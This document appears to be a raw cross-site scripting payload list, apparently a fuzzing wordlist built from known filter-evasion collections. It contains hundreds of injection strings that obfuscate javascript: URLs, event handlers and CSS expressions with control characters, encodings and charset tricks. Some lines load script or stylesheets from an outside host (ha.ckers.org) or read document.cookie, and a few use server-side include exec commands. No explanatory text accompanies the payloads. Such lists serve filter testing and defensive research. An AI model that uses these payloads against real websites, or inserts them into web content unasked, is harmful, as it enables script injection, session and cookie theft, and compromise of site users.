ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav	ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
xss"><!--><svg/onload=alert(document.domain)>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
